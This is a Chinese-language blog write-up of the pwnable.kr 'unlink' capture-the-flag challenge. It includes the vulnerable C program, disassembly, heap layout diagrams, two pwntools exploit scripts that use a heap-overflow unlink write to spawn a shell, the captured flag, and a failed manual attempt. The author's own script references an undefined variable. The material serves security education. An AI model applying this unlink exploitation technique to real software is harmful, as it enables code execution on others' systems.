---
title: unlink
date: 2017-08-14 21:17:15
tags:
- pwn
- heap
categories:
- pwnable.kr
- security
---
pwnable.kr 中简单的堆溢出利用。
堆溢出的原理：用精心构造的数据去溢出下一个堆块的块首，改写堆块的前向指针和后向指针，然后再分配、释放、合并等操作发生时伺机获取一次向内存任意地址写入任意数据的机会。

<!-- more -->

连接服务器。
```
ssh unlink@pwnable.kr -p2222 (pw: guest)
```
查看文件，发现源码和可执行文件。
运行可执行文件，我们获得了堆、栈地址。

查看可执行文件`unlink`
```
unlink@ubuntu:~$ checksec unlink
[*] '/home/unlink/unlink'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE

```
开启了NX保护。

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
typedef struct tagOBJ{
        struct tagOBJ* fd;
        struct tagOBJ* bk;
        char buf[8];
}OBJ;

void shell(){
        system("/bin/sh");
}

void unlink(OBJ* P){
        OBJ* BK;
        OBJ* FD;
        BK=P->bk;
        FD=P->fd;
        FD->bk=BK;
        BK->fd=FD;
}
int main(int argc, char* argv[]){
        malloc(1024);
        OBJ* A = (OBJ*)malloc(sizeof(OBJ));
        OBJ* B = (OBJ*)malloc(sizeof(OBJ));
        OBJ* C = (OBJ*)malloc(sizeof(OBJ));

        // double linked list: A <-> B <-> C
        A->fd = B;
        A->fd = B;
        B->bk = A;
        B->fd = C;
        C->bk = B;

        printf("here is stack address leak: %p\n", &A);
        printf("here is heap address leak: %p\n", A);
        printf("now that you have leaks, get shell!\n");
        // heap overflow!
        gets(A->buf);

        // exploit this unlink!
        unlink(B);
        return 0;
}

```
查看源码，可以发现，给A赋值时使用了`gets`函数，存在溢出B堆和C堆的可能，并在gets函数后调用了`unlink(B)`，而`unlink()`函数模拟了堆溢出后`free`造成的任意地址写操作，即0day安全中提到的`DWROD SHOOT`，存在unlink漏洞。并且源程序给出了shell函数，此函数地址可以作为shellcode的地址。

```
info functions
```
shell函数的地址：`0x080484eb`。

unlink(B)完成的操作为：

	B->fd->bk = B->bk
	B->bk->fd = B->fd

如果要利用unlink来覆盖返回地址，则堆B在内存中的布局应该是这样的

	+-------------------+-------------------+
	|stack[return addr] |     addr shell    |
	+-------------------+-------------------+
	|               padding                 |
	+---------------------------------------+
如果这么构造，这里有问题。
- shell函数的地址在代码段，代码段是没有写权限的，所以在执行`B->bk->fd = B->fd`会报错。所以`B->fd`,`B->bk`必须指向可读可写的内存。
所以必须两个地址都要可写。
查看汇编代码，main中存在这么几行代码：
```
   0x080485f2 <+195>:	call   0x8048504 <unlink>
   0x080485f7 <+200>:	add    $0x10,%esp
   0x080485fa <+203>:	mov    $0x0,%eax
   0x080485ff <+208>:	mov    -0x4(%ebp),%ecx
   0x08048602 <+211>:	leave  
   0x08048603 <+212>:	lea    -0x4(%ecx),%esp
   0x08048606 <+215>:	ret  
```
leave在32位汇编下相当于
```
    mov esp,ebp                                            
    pop ebp
```
整合一下就是
```
   mov    -0x4(%ebp),%ecx
   mov 	  %ebp,%esp
   pop    %ebp
   lea    -0x4(%ecx),%esp
   ret  
```

`ret`指令的作用是栈顶元素出栈，即`%esp`，其值赋给`%eip`寄存器。
从上面可以逆向分析到,存在以下一个关系：

	%ecx <= %ebp-0x4
	%esp <= %ecx-0x4 


我们可以将shellcode+0x4地址写入%ebp-0x4中，达到跳转的目的。

通过逆向可知，&A，&B，&C的地址在栈上，分别为 %ebp-0x14, %ebp-0x10, %ebp-0xc。
```
   0x08048555 <+38>:	call   0x80483a0 <malloc@plt>
   0x0804855a <+43>:	add    $0x10,%esp
   0x0804855d <+46>:	mov    %eax,-0x14(%ebp)
   0x08048560 <+49>:	sub    $0xc,%esp
   0x08048563 <+52>:	push   $0x10
   0x08048565 <+54>:	call   0x80483a0 <malloc@plt>
   0x0804856a <+59>:	add    $0x10,%esp
   0x0804856d <+62>:	mov    %eax,-0xc(%ebp)
   0x08048570 <+65>:	sub    $0xc,%esp
   0x08048573 <+68>:	push   $0x10
   0x08048575 <+70>:	call   0x80483a0 <malloc@plt>
   0x0804857a <+75>:	add    $0x10,%esp
   0x0804857d <+78>:	mov    %eax,-0x10(%ebp)
   0x08048580 <+81>:	mov    -0x14(%ebp),%eax

```
根据运行程序提供的信息，我们能够拿到`&A`=%ebp-0x14，则可控制的栈地址为%ebp-0x4，可控的栈地址为`&A+0x10`。

我们将shellcode的地址写入`&A+0x10`。

通过GDB分析，将断点设在` 0x080485f2 <+195>:	call   0x8048504 <unlink>`上，可以观察内存中堆的变化。

只要能够修改ESP寄存器的内容修改为shellcode的地址就能够执行shellcode。也就是说，利用堆溢出控制栈数据，这里采用unlink的DWORD SHOOT技术。

划出堆中简略布局图。

	+-------------------+-------------------+  <- [A]
	|        FD         |        BK         |
	+-------------------+-------------------+  <- [A->buf]
	|     shellcode     |       AAAA        |
	+---------------------------------------+
	|              AAAAAAAA                 |
	+---------------------------------------+  <- [B]
	|       fd1         |        bk2        |
	+-------------------+-------------------+


可以利用`BK->fd=FD`得到以下布局，

	+-------------------+-------------------+  <- [A]
	|        FD         |        BK         |
	+-------------------+-------------------+  <- [A->buf]
	|     shell addr    |      'aaaa'       |
	+---------------------------------------+
	|              'aaaaaaaa'               |
	+---------------------------------------+  <- [B]
	|     A + 12        |     &A + 16       |
	+-------------------+-------------------+

或者利用`FD->bk=BK`得到以下布局

	+-------------------+-------------------+  <- [A]
	|        FD         |        BK         |
	+-------------------+-------------------+  <- [A->buf]
	|     shell addr    |      'aaaa'       |
	+---------------------------------------+
	|              'aaaaaaaa'               |
	+---------------------------------------+  <- [B]
	|     &A + 12       |     A + 12        |
	+-------------------+-------------------+


漏洞利用代码
```
# -*- coding: utf-8 -*-

from pwn import *
#context(log_level="debug")
s =  ssh(host='pwnable.kr',
         port=2222,
         user='unlink',
         password='guest'
        )
p = s.process("./unlink")

p.recvuntil("here is stack address leak: ")
stack_addr = int(p.recv(10),16)
p.recvuntil("here is heap address leak: ")
heap_addr = int(p.recv(9),16)

p.recvuntil("now that you have leaks, get shell!\n")

shell_func_addr = 0x080484eb
padding = 'A'*12
#方法一
fdB = heap_addr + 12
bkB = stack_addr + 16
'''
#方法二
或者交换位置，但要重新计算偏移值
bkB = heap_addr + 12
fdB = stack_addr + 12
'''
payload = p32(shell_buf) + padding + p32(fdB) + p32(bkB)

p.sendline(payload)

p.interactive()
```

等待连接成功后，顺利拿到shell。
```
$ $ cat flag
conditional_write_what_where_from_unl1nk_explo1t
```
目录下，作者也给出了参考答案：
```
from pwn import *
context.arch = 'i386'   # i386 / arm
r = process(['/home/unlink/unlink'])
leak = r.recvuntil('shell!\n')
stack = int(leak.split('leak: 0x')[1][:8], 16)
heap = int(leak.split('leak: 0x')[2][:8], 16)
shell = 0x80484eb
payload = pack(shell)       # heap + 8  (new ret addr)
payload += pack(heap + 12)  # heap + 12 (this -4 becomes ESP at ret)
payload += '3333'       # heap + 16
payload += '4444'
payload += pack(stack - 0x20)   # eax. (address of old ebp of unlink) -4
payload += pack(heap + 16)  # edx.
r.sendline( payload )
r.interactive()
```



## PS，没有成功的方法：

打开两个终端，第一个终端利用三个`cat`命令，等待读取`/tmp/payloadsss`中数据，
```
unlink@ubuntu:~$ (cat -; cat /tmp/payloadsss; cat -) | ./unlink 
here is stack address leak: 0xffdfd8e4
here is heap address leak: 0x99c8410
now that you have leaks, get shell!


```
第二个终端，将payload写入文件中。
```
unlink@ubuntu:~$ python -c "print  '\xeb\x84\x04\x08'+'A'*12+ '\x1c\x84\x9c\x09' + '\xf4\xd8\xdf\xff' " > /tmp/payloadsss
```
再在第一个终端中，输入`ctrl+D`。

-^-很可惜，我没有成功。

# 总结：

1. 经典的unlink是通过改写got表中的free地址为我们的shellcode的地址，这里也没有用到free函数。
2. 汇编语言leave是mov esp, ebp 		pop ebp
3. pwntools中的API使用，ssh,process,remote等。 
4. 堆溢出的原理：用精心构造的数据去溢出下一个堆块的块首，改写堆块的前向指针和后向指针，然后再分配、释放、合并等操作发生时司机获取一次向内存任意地址写入任意数据的机会。

# 参考资料
[1] [Unlink - Pwnable.kr](https://werew.tk/article/17/unlink-pwnablekr)
[2] [全面剖析Pwnable.kr unlink](http://blog.csdn.net/qq_33528164/article/details/77061932)
[3] [pwnable.kr之初探unlink](https://de4dcr0w.github.io/2017/04/23/pwnable.kr%E4%B9%8Bunlink%E5%88%9D%E6%8E%A2/)